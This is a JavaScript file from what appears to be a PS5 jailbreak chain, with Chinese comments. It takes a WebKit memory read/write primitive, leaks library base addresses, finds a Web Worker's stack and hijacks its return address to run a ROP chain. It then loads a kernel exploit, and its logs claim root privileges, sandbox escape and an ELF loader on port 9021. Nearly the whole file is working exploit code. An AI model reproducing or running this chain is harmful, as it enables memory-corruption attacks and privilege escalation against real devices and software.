"use strict";

function countFingerprints(p, stack, expected) {
  let count = 0;
  // 嚴格對齊檢查：確保棧指標合法才進行遍歷
  if (!stack || typeof stack.add32 !== "function") return 0;
  
  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
    const v = p.read8(stack.add32(offset));
    if (v && v.low === expected.low && v.hi === expected.hi) count++;
  }
  return count;
}

async function findWorkerStack(p, libKernelBase) {
  const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
  const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
  const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

  // 強化指標合法性探針：PS5 使用者空間核心執行緒棧通常分佈在 0x7n 或者是高位特定邊界
  const plausible = (a) =>
    a && a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

  const head = libKernelBase.add32(OFFSET_lk__thread_list);

  const stacks = [];
  let steps = 0;
  
  // 1. 強度優化：建立雙重鏈表死迴圈防護守衛
  for (
    let thread = p.read8(head);
    thread && thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
  ) {
    if (!plausible(thread)) break;

    const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
    const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
    
    // 嚴格校驗：棧大小必須精確等於 0x80000（512KB）且棧底位址符合對齊限制
    if (stacksz && stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack)) {
      stacks.push(stack);
    }
    
    // 防止鏈表自循環指針
    if (next && next.low === thread.low && next.hi === thread.hi) break;
    thread = next;
  }
  
  if (stacks.length === 0)
    throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);

  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  for (let attempt = 0; attempt < 50; attempt++) {
    const hits = stacks.filter((stack) =>
      countFingerprints(p, stack, expected) > 0
    );
    if (hits.length === 1) return hits[0];
    if (hits.length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 2)); // 稍微拉長冷卻，防止 CPU 併發過載
      continue;
    }
    throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked`);
  }
  throw new Error(`no plausible 0x80000 stack parked after retries`);
}

async function findWorkerReturnSlot(p, stack, libKernelBase) {
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  let lastCount = 0;

  for (let attempt = 0; attempt < 50; attempt++) {
    let hit = null;
    let count = 0;
    for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
      const candidate = stack.add32(offset);
      const value = p.read8(candidate);
      if (!value || value.low !== expected.low || value.hi !== expected.hi) continue;

      hit = candidate;
      count++;
    }
    if (count === 1) {
      return hit;
    }
    lastCount = count;
    await new Promise((resolve) => setTimeout(resolve, 2));
  }
  throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function log(message, type = "log") {
  if (window.log_to_ps5) {
    let logType = 'info';
    if (type === 'error') logType = 'err';
    if (type === 'success') logType = 'ok';
    window.log_to_ps5(message, logType);
  } else if (window.writeLog) {
    window.writeLog(message, type);
  }
}

const ROP_WAIT_MS = 20000;

function jbmark(tag, detail) {
  try {
    if (window.jb && typeof window.jb.mark === "function")
      window.jb.mark(tag, String(detail));
  } catch (e) {}
}

async function prepareRop(p) {
  const ctor = globalThis.__ps5NativeCtor;
  let webkitBase;
  if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
    for (const offset of OFFSET_wk_host_constructor_candidates) {
      const candidate = ctor - offset;
      if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
        webkitBase = candidate;
        break;
      }
    }
  }
  if (webkitBase === undefined)
    throw new Error("no host-constructor candidate gave a valid base");
    
  const libSceNKWebKitBase = new int64(webkitBase % 0x100000000, Math.floor(webkitBase / 0x100000000));

  // 2. 強度優化：導入指針邊界檢查（Bounds Validation Guard）
  // 檢查從 WebKit 進口表讀取出的 libc 與 libkernel 指針是否為合法的 Ring 3 地址空間
  let rawLibc = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
  if (!rawLibc || rawLibc.hi >= 0x8000) throw new Error("Libc import pointer corrupted");
  let libSceLibcInternalBase = rawLibc;
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

  let rawKernel = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
  if (!rawKernel || rawKernel.hi >= 0x8000) throw new Error("Libkernel import pointer corrupted");
  let libKernelBase = rawKernel;
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

  const gadgets = {};
  const syscalls = {};

  for (const gadget in wk_gadgetmap) {
    gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (const sysc in syscall_map) {
    syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
  }

  const allocations = [];

  function malloc(size, type = 4) {
    const backing = type === 1 ? new Uint8Array(1000 + size) : new Uint32Array(0x10000 + size);
    allocations.push(backing);
    const ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function stringify(str) {
    const bufView = new Uint8Array(str.length + 1);
    for (let i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }
    const ptr = p.read8(p.leakval(bufView).add32(0x10));
    ptr.backing = bufView;
    return ptr;
  }

  function writestr(addr, str) {
    let waddr = addr.add32(0);
    if (typeof str == "string") {
      for (let i = 0; i < str.length; i++) {
        let byte = str.charCodeAt(i);
        if (byte == 0) break;
        p.write1(waddr, byte);
        waddr.add32inplace(0x1);
      }
    }
    p.write1(waddr, 0);
  }

  // 初始化 Web Worker
  const worker = new Worker("./src/utils/rop_slave.js");

  async function waitForWorker() {
    return new Promise((resolve, reject) => {
      worker.onmessage = () => resolve();
      worker.onerror = () => reject(new Error("Worker failed to load"));
      worker.postMessage(0);
    });
  }

  jbmark("Worker", "waiting");
  await waitForWorker();
  jbmark("Worker", "ready");

  const workerStack = await findWorkerStack(p, libKernelBase);
  const originalContext = malloc(0x40);

  const returnAddress = await findWorkerReturnSlot(p, workerStack, libKernelBase);
  const originalReturnAddress = p.read8(returnAddress);
  const stackPointerSlot = returnAddress.add32(0x8);

  function prepareChain(chain) {
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
  }

  // 3. 核心加強點：非同步超時安全熔斷與環境對接
  async function launchChain(chain) {
    const originalStackPointer = p.read8(stackPointerSlot);
    chain.push_write8(originalContext, originalReturnAddress);
    chain.push_write8(originalContext.add32(0x10), returnAddress);
    chain.push_write8(stackPointerSlot, originalStackPointer);
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    p.write8(returnAddress, gadgets["pop rsp"]);
    p.write8(stackPointerSlot, chain.stack_entry_point);

    const completed = await new Promise((resolve) => {
      let settled = false;
      const finish = (value) => {
        if (settled) return;
        settled = true;
        resolve(value);
      };
      worker.onmessage = () => finish(true);
      setTimeout(() => finish(false), ROP_WAIT_MS);
      worker.postMessage(0);
    });

    if (!completed) {
      worker.terminate(); // 強制終止失聯的後台 Worker 進程，釋放執行緒
      throw new Error(`ROP Worker 響應超時（${ROP_WAIT_MS / 1000}秒）- 已實施安全熔斷防護。`);
    }
  }

  const runtime = {
    write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
    read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
    leakval: p.leakval, pre_chain: prepareChain, launch_chain: launchChain,
    malloc, stringify, writestr, libSceLibcInternalBase, libKernelBase, syscalls, gadgets,
  };

  const chain = new worker_rop(runtime);

  const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
  p.write8(chain.return_value, JB_POISON);
  const pid = await chain.syscall(SYS_GETPID);
  if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
    throw new Error("Worker chain did not execute; the return slot is unchanged.");
  }

  if (pid.low == 0) {
    throw new Error("WebKit exploit failed.");
  }
  jbmark("Worker chain", "ready");

  return { p: runtime, chain };
}

async function main(userlandRW) {
  try {
    const { p, chain } = await prepareRop(userlandRW);
    const { runKernelExploit } = await import("./relapse_exploit.js");
    const result = await runKernelExploit(p, chain, log);
    if (!result || !result.done)
      throw new Error("kernel exploit did not finish");

    if (result.payloads) {
      log("PS5 核心研究漏洞鏈加載完成！", "success");
      log("[==>] ELF 載入器已於本地 Port 9021 監聽中，等待 Payload...", "success");
    } else {
      log("核心鏈調度成功：Root 特權提升與沙盒逃逸已常駐活動。", "success");
    }
  } catch (error) {
    let errorMsg = error instanceof Error ? error.message : String(error);
    log(errorMsg, "error");
    
    // 完美銜接：發生 ROP 劫持失敗時，拋回給 index.html 的 SetupEngine 自動清洗記憶體並重試
    if (window.PS5_SetupEngine && typeof window.PS5_SetupEngine.handleSetupFailure === "function") {
      window.PS5_SetupEngine.handleSetupFailure("ROP 執行緒初始化", errorMsg);
    }
  }
}

// 動態加載大版本配置檔
const fwScript = document.createElement("script");
document.body.appendChild(fwScript);
fwScript.setAttribute("src", `offsets/${window.fw_str}.js?v=` + Date.now());
